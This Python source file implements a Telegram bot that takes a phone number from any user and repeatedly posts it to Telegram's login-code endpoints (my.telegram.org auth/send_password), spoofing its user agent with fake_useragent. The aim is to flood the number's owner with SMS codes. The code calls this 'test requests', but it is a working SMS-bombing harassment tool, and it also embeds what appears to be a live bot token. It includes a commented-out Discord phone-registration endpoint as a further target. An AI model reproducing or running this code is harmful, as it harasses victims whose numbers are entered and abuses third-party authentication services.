# === Imports ===
import telebot
import requests
import fake_useragent
import threading
import time

# === Telegram Bot Setup ===
TOKEN = "8294178048:AAGu4hsFtyVrvw3T3ZiMWm8TjXT_qqiVNFc"
bot = telebot.TeleBot(TOKEN)

# === Fake User Agent ===
user = fake_useragent.UserAgent().random
headers = {'user-agent': user}

# === Dictionary to keep track of threads and counts per user ===
user_threads = {}  # chat_id : thread
user_counts = {}   # chat_id : {'success': x, 'fail': y}
stop_flags = {}    # chat_id : True/False

# === /start Command ===
@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    bot.send_message(chat_id,
                     "Hello! Send me a phone number to start test requests.\n"
                     "Then click /stop to stop the test.")

# === /stop Command ===
@bot.message_handler(commands=['stop'])
def stop(message):
    chat_id = message.chat.id
    stop_flags[chat_id] = True
    bot.send_message(chat_id, "Stop signal received. Stopping your test...")

# === Function to run requests in sequence ===
def run_requests(chat_id, number):
    count = {'success': 0, 'fail': 0}
    stop_flags[chat_id] = False

    while not stop_flags[chat_id]:
        try:
            # === Requests sequence ===
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
            requests.get('https://telegram.org/support?setln=ru', headers=headers)
            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
            requests.get('https://telegram.org/support?setln=ru', headers=headers)
            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
            # Discord register phone (fake placeholder)
            # requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, data={'phone': number})
            
            count['success'] += 1
        except Exception as e:
            count['fail'] += 1
        
        # Send periodic update every 5 requests
        if (count['success'] + count['fail']) % 5 == 0:
            bot.send_message(chat_id,
                             f"Progress for {number}:\n"
                             f"Success: {count['success']}\n"
                             f"Failed: {count['fail']}")
        time.sleep(0.5)  # slight delay to avoid super-fast looping
    
    bot.send_message(chat_id,
                     f"Test stopped for {number}.\n"
                     f"Total Success: {count['success']}\n"
                     f"Total Failed: {count['fail']}")

# === Phone Number Handler ===
@bot.message_handler(func=lambda m: True)
def handle_number(message):
    chat_id = message.chat.id
    number = message.text.strip()

    if not number.isdigit():
        bot.send_message(chat_id, "Please send a valid number.")
        return

    if chat_id in user_threads and user_threads[chat_id].is_alive():
        bot.send_message(chat_id, "A test is already running. Please /stop first.")
        return

    bot.send_message(chat_id, f"Starting test requests for: {number}")

    # Start thread
    t = threading.Thread(target=run_requests, args=(chat_id, number))
    t.start()
    user_threads[chat_id] = t

# === Start Polling ===
bot.polling()
